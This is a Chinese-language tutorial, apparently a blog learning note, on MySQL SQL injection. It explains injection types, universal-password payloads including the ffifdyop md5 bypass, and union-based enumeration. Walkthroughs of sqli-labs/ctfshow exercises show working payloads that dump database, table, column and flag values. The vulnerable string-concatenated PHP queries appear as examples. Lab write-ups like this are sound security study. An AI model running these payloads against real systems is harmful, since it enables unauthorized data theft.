<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250318195443038.png" alt="image-20250318195443038"></p>
<p>查表名，table_schema 可以指定数据库</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token string">'数据库名'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250318195504311.png" alt="image-20250318195504311"></p>
<p>有 t_book , t_user 两个表</p>
<p>查 t_book 下的列名</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'t_book'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250318195938371.png" alt="image-20250318195938371"></p>
<p>查 t_book 表 bookname 列的字段，注意这里的列名和表名都不能用单&#x2F;双引号括起来，会被识别为普通字符串而非表名&#x2F;列名，不过反引号不影响</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>bookname<span class="token punctuation">)</span> <span class="token keyword">from</span> t_book<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250318200021163.png" alt="image-20250318200021163"></p>
<p><strong>mysql注释符</strong>：</p>
<ul>
<li><p><code>-- </code>：web端注入时传入的一般是<code>--+</code>，这里的 <code>+</code> 代指空格，通常 url 解码时会直接把 + 解码为空格</p>
</li>
<li><p><code>#</code>：注意，<code>#</code> 在 get 请求中有特殊含义，get 请求传入时需要 url 编码</p>
</li>
</ul>
<p><strong>mysql函数</strong>：除了 <code>database()</code> 以外，还有一些常用的函数</p>
<ul>
<li><p><code>VERSION()</code>：返回当前 MySQL 服务器的版本信息</p>
</li>
<li><p><code>USER()</code>：返回当前 MySQL 会话中登录用户的信息，包括用户名和主机名</p>
</li>
</ul>
<hr>
<h1 id="Sql注入原理"><a href="#Sql注入原理" class="headerlink" title="Sql注入原理"></a>Sql注入原理</h1><p>以 PHP 服务器为例，与数据库的交互的 PHP 代码大致如下：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// 拼接sql语句指定账密查找用户</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select username,password from table_name where username = '"</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"' and password = '"</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"' limit 1;"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>这里的 limit 1 是返回查询的第一行的意思</p>
<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250318202322360.png" alt="image-20250318202322360"></p>
<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250318202335158.png" alt="image-20250318202335158"></p>
<p>我们知道，任何语言的引号都必须是成对出现的，name 参数前拼接的 sql 语句是 <code>select username,password from table_name where username = &#39;</code></p>
<p>而我们可以在 name 和 pass 两个参数这里随意传入字符串，也就是说，如果我们在 name 或 pass 参数（这里以 name 参数为例，pass 参数放着不管）传入一个 <code>&#39;#</code> 时，这里的 sql 语句就会变成</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> username<span class="token punctuation">,</span>password <span class="token keyword">from</span> table_name <span class="token keyword">where</span> username <span class="token operator">=</span> <span class="token string">''</span><span class="token comment">#' and password = '' limit 1;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>此时前两个单引号成对，后面的语句被 # 注释掉，实际执行的 sql 语句就变成了</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> username<span class="token punctuation">,</span>password <span class="token keyword">from</span> table_name <span class="token keyword">where</span> username <span class="token operator">=</span> <span class="token string">''</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<hr>
<h1 id="注入位置"><a href="#注入位置" class="headerlink" title="注入位置"></a>注入位置</h1><p>从渗透的角度来看，可能存在的注入点通常是在登录、注册处</p>
<p>或者一些查询系统（如图书查询系统）的查询参数上</p>
<hr>
<h1 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h1><ul>
<li>数字型注入：</li>
</ul>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select username,password from table_name where username = "</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">" and password = "</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">" limit 1;"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>  这里的 sql 语句没用到引号闭合参数传入的内容，可以直接填入数字并注释后文实现注入：<code>1#</code></p>
<p>  如果想传入字符串的话需要先转换为16进制再传入</p>
<p>  <img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250318204831586.png" alt="image-20250318204831586"></p>
<ul>
<li><p>字符型注入：当输入的参数<strong>有引号闭合</strong>从而当作字符串处理时，称为字符型注入</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select username,password from table_name where username = '"</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"' and password = '"</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"' limit 1;"</span><span class="token punctuation">;</span>

<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'select username,password from table_name where username = "'</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'" and password = "'</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'" limit 1;'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>此时的注入方式就是 <code>1&#39;#</code> 或 <code>1&quot;#</code></p>
</li>
<li><p>搜索型注入：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select * from user where password like '%<span class="token interpolation"><span class="token variable">$pwd</span></span>%' order by password"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>基于用户输入的 pwd 在 user 表中模糊匹配可能的的 password</p>
<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250414195758209.png" alt="image-20250414195758209"></p>
<p>如果 pwd 输入</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">%</span><span class="token string">'and 1=1 and '</span><span class="token operator">%</span><span class="token string">'='</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>此时的sql语句如下：</p>
<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250414200235418.png" alt="image-20250414200235418"></p>
<p>返回全部内容，把 1&#x3D;1 改为 1&#x3D;2 后发现不回显任何内容，说明存在注入</p>
</li>
</ul>
<hr>
<h1 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h1><p>光注入不行，还要能构成正确的语句并返回结果，第一个要学的就是万能密码</p>
<p>原理：利用闭合，使 sql 语句永真</p>
<p>对于以下代码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select username,password from user where username !='flag' and id = '"</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"';"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>字符型注入点在 id 参数上，尝试以下payload：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token string">'or 1 = 1#
'</span><span class="token operator">or</span><span class="token string">'1'</span><span class="token operator">=</span><span class="token string">'1
1'</span><span class="token operator">or</span><span class="token string">'1'</span><span class="token operator">=</span><span class="token string">'1'</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>此时的sql语句分别如下：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> username<span class="token punctuation">,</span>password <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> username <span class="token operator">!=</span><span class="token string">'flag'</span> <span class="token operator">and</span> id <span class="token operator">=</span> <span class="token string">''</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment">#';</span>
<span class="token keyword">select</span> username<span class="token punctuation">,</span>password <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> username <span class="token operator">!=</span><span class="token string">'flag'</span> <span class="token operator">and</span> id <span class="token operator">=</span> <span class="token string">''</span> <span class="token operator">or</span> <span class="token string">'1'</span><span class="token operator">=</span><span class="token string">'1'</span><span class="token punctuation">;</span>
<span class="token keyword">select</span> username<span class="token punctuation">,</span>password <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> username <span class="token operator">!=</span><span class="token string">'flag'</span> <span class="token operator">and</span> id <span class="token operator">=</span> <span class="token string">''</span> <span class="token operator">or</span> <span class="token string">'1'</span><span class="token operator">=</span><span class="token string">'1'</span><span class="token comment">#';</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>以第一句为例，因为 and 的执行优先级 &gt; or，所以整个 sql 语句可以看成两个部分：<code>select username,password from user where username !=&#39;flag&#39; and id = &#39;&#39;</code> 和 <code>1=1</code>，此时两侧的结果分别为 False 和 True，而<code>False or True = True</code>，所以实现永真</p>
<br>

<p>md5加密下的万能密码：</p>
<p>对于下面的代码</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM admin WHERE username = 'admin' and password = '"</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"'"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>可以使用 <code>ffifdyop</code> 绕过：</p>
<p>因为数据库会把16进制转为 ascii 解释，而<code>md5(ffifdyop)</code>的结果为<code>276f722736c95d99e921722cf9ed621c</code>，会返回成一个16进制字符串，这个字符串16进制转换后的结果为<code>&#39;or&#39;6É].é!r,ùíb.</code>，此时就提供了我们需要的<code>&#39;or&#39;字符串</code>，实现了闭合，且后面的字符串将被视为 true，此时整个sql语句为</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> admin <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'admin'</span> <span class="token operator">and</span> password <span class="token operator">=</span> <span class="token string">''</span><span class="token operator">or</span><span class="token string">'字符串'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>语句永真</p>
<p>同样效果的还有：</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">129581926211651571912466741651878684928<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h1 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h1><p><code>UNION</code> 函数：在 MySQL 中，UNION 用于将两个或多个 SELECT 查询的结果组合为一个结果集</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token keyword">FROM</span> table1 <span class="token keyword">WHERE</span> condition
<span class="token keyword">UNION</span>
<span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token keyword">FROM</span> table2 <span class="token keyword">WHERE</span> condition<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250414201139799.png" alt="image-20250414201139799"></p>
<p>对于这样的代码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM user WHERE username = 'admin' and password = '"</span><span class="token operator">.</span><span class="token variable">$password</span><span class="token punctuation">,</span><span class="token operator">.</span><span class="token string double-quoted-string">"'"</span><span class="token punctuation">;</span>

union select column_name<span class="token punctuation">,</span>column_name from table_name where column_name<span class="token operator">=</span><span class="token string single-quoted-string">'flag'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>通过 union 联合注入，我们可以把前面查询的结果和后面合并在一起，从而可控返回的内容</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">user</span> <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'admin'</span> <span class="token operator">and</span> password <span class="token operator">=</span> <span class="token string">'1'</span>
<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> username <span class="token operator">=</span> <span class="token string">'admin'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250414202012356.png" alt="image-20250414202012356"></p>
<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250414201954557.png" alt="image-20250414201954557"></p>
<hr>
<h2 id="sqli-labs-less-1（字符型）"><a href="#sqli-labs-less-1（字符型）" class="headerlink" title="sqli-labs less-1（字符型）"></a>sqli-labs less-1（字符型）</h2><p>在线环境是 ctfshow web517 </p>
<p>以这题为例，过一遍黑盒情况下字符型注入的流程</p>
<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250414215347609.png" alt="image-20250414215347609"></p>
<h3 id="注入点判断"><a href="#注入点判断" class="headerlink" title="注入点判断"></a>注入点判断</h3><p>这里提供一个 ID 参数，要求输入类型是数字，尝试传入 id&#x3D;1</p>
<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250414215632262.png" alt="image-20250414215632262"></p>
<p>成功回显数据库的内容，但我们怎么可能真的只会传数字呢，尝试传入 <code>1&#39;</code> 和 <code>1&quot;</code> 判断测试闭合类型</p>
<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250414215815998.png" alt="image-20250414215815998"></p>
<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250414215830359.png" alt="image-20250414215830359"></p>
<p>可以看到只有在输入 <code>1&#39;</code> 时会产生语法报错：<code>near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1</code></p>
<p>此时的部分 sql 语句是：<code>&#39;1&#39;&#39; LIMIT 0,1</code></p>
<p>可以证明此处存在字符型注入</p>
<h3 id="判断回显列数"><a href="#判断回显列数" class="headerlink" title="判断回显列数"></a>判断回显列数</h3><p>在白盒审计的情况下，我们可以通过对代码的分析看出后端回显查询结果的哪几列到前端给用户查看，即回显位</p>
<p>如下示例代码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT first_name, last_name FROM users WHERE user_id = '<span class="token interpolation"><span class="token variable">$id</span></span>';"</span><span class="token punctuation">;</span>

<span class="token operator">...</span><span class="token operator">...</span>

<span class="token keyword">while</span><span class="token punctuation">(</span> <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token variable">$first</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"first_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
<span class="token variable">$last</span>  <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"last_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre>ID: <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$id</span><span class="token punctuation">&#125;</span></span>&lt;br />First name: <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$first</span><span class="token punctuation">&#125;</span></span>&lt;br />Surname: <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$last</span><span class="token punctuation">&#125;</span></span>&lt;/pre>"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>从数据库中查询了 first_name 和 last_name 这 2 列数据，并且 2 列都回显到了前端</p>
<br>

<p>而在黑盒下，我们需要使用 <code>order by</code> 子句判断<strong>回显的列数</strong></p>
<blockquote>
<p><code>ORDER BY</code> 是 SQL 中用于对查询结果进行排序的子句，它按照指定的列对结果进行 <strong>升序（ASC）</strong>或 <strong>降序（DESC）</strong>排序。<br>列可以通过名称（如 column_name）或位置（如 1、2 表示第一列、第二列）指定，如果指定的列不存在，数据库会抛出错误。</p>
</blockquote>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token keyword">FROM</span> table1 <span class="token keyword">WHERE</span> condition <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> column1<span class="token punctuation">;</span>
<span class="token keyword">SELECT</span> id<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password <span class="token keyword">FROM</span> <span class="token keyword">user</span> <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> <span class="token number">1</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250414221748479.png" alt="image-20250414221748479"></p>
<p>此时指定第1列 id，默认升序排列</p>
<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250414222010842.png" alt="image-20250414222010842"></p>
<p>这里只返回 id，username，password 三列，当我们试图以第 4 列进行排序时就会报错</p>
<p>由此可以利用这点判断后端语句查询了几列</p>
<p>payload：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' order by 3 --+
1'</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">4</span> <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250414222206757.png" alt="image-20250414222206757"></p>
<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250414222226236.png" alt="image-20250414222226236"></p>
<p>由此可以判断这里只查询了 3 列</p>
<h3 id="判断前端回显位"><a href="#判断前端回显位" class="headerlink" title="判断前端回显位"></a>判断前端回显位</h3><p>后端查询的是3列，但前端只返回了2列的结果，为了确定是哪两列，我们需要在注入的同时采用<strong>占位符</strong>进行测试</p>
<blockquote>
<p>占位符是一种临时的、无实际业务意义的值，用于填充查询的某些位置，使其符合语法要求或满足特定的逻辑需要。<br>占位符的主要目的是为了确保 SQL 查询的结构完整性，特别是在不需要具体数据或暂时无法提供实际数据时。</p>
</blockquote>
<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250414222551483.png" alt="image-20250414222551483"></p>
<p>于是构造 payload</p>
<p>注意为了让前面查询的结果不影响到 union 后面查询的结果，通常需要让前面返回一个空值，这里直接传 -1 就行</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250414223253976.png" alt="image-20250414223253976"></p>
<p>可以看出来第2列第3列会回显在页面上，那么接下来的查询就在第2列或第3列上进行查询</p>
<h3 id="查询数据库名"><a href="#查询数据库名" class="headerlink" title="查询数据库名"></a>查询数据库名</h3><p>直接用 database() 方法获取当前数据库名</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250414223508453.png" alt="image-20250414223508453"></p>
<p>当前数据库名是 security</p>
<h3 id="查询数据库中的表名"><a href="#查询数据库中的表名" class="headerlink" title="查询数据库中的表名"></a>查询数据库中的表名</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250414224635050.png" alt="image-20250414224635050"></p>
<p>有 emails, referers, uagents, users 表，没找到 flag</p>
<p>猜测是数据库不对，用<code>union select 1,SCHEMA_NAME,3 from information_schema.SCHEMATA</code>查一下数据库（这里返回的是第一条数据库名，如果要查询所有的数据库要用<code>group_concat(SCHEMA_NAME)</code>）</p>
<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250414230412380.png" alt="image-20250414230412380"></p>
<p>发现数据库 ctfshow ，再查表</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='</span>ctfshow'<span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250414230511076.png" alt="image-20250414230511076"></p>
<p>找到 flag 表</p>
<h3 id="查表中的列名"><a href="#查表中的列名" class="headerlink" title="查表中的列名"></a>查表中的列名</h3><p>因为不是当前数据库，这里查询需要带上 table_schema</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='</span>ctfshow<span class="token string">' and table_name='</span>flag' <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250414230606017.png" alt="image-20250414230606017"></p>
<p>有 id，flag 列</p>
<h3 id="查相应字段的值"><a href="#查相应字段的值" class="headerlink" title="查相应字段的值"></a>查相应字段的值</h3><p>直接用 <code>group_concat</code> 查询多列</p>
<blockquote>
<p>GROUP_CONCAT() 是一个 MySQL 聚合函数，用于将一个分组内的<strong>多行值</strong>连接成一个字符串。<br>它可以按照指定的分隔符或顺序对结果进行拼接。将多行合并为一行。</p>
</blockquote>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,group_concat(id,'</span><span class="token comment">--',flag),3 from ctfshow.flag --+</span>
或
<span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>字段名<span class="token punctuation">)</span> <span class="token keyword">from</span> 表名<span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250414230841173.png" alt="image-20250414230841173"></p>
<hr>
<h2 id="sqli-labs-less-11（POST）"><a href="#sqli-labs-less-11（POST）" class="headerlink" title="sqli-labs less-11（POST）"></a>sqli-labs less-11（POST）</h2><p>ctfshow web527</p>
<p>传参采用 POST，通过报错回显 sql 语句<code>&#39;1&#39;&#39; and password=&#39;&#39; LIMIT 0,1</code>可知闭合方式是 <code>1&#39;</code></p>
<p>注意从前端表单框上直接传 <code>+</code> 不会被解析为空格，建议抓包或者直接传空格，也可以用 # 注释</p>
<p>测试登录进 admin 账户</p>
<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250416215117588.png" alt="image-20250416215117588"></p>
<p>可知这里存在注入</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' order by 2#
1'</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span><span class="token comment">#</span>
<span class="token comment">-- 查询2列</span>

<span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,2#
-- 返回1，2这2列

-1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>SCHEMA_NAME <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>SCHEMATA<span class="token comment">#</span>
<span class="token comment">-- 查询数据库名，这里得到ctfshow</span>

<span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,group_concat(table_name) from information_schema.tables where table_schema='</span>ctfshow<span class="token string">'#
-- 查询表名，这里得到flagugsd

-1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'ctfshow'</span> <span class="token operator">and</span> table_name<span class="token operator">=</span><span class="token string">'flagugsd'</span><span class="token comment">#</span>
<span class="token comment">-- 查询列名，这里得到id, flag43s</span>

<span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,group_concat(id,'</span><span class="token comment">--',flag43s) from ctfshow.flagugsd#</span>
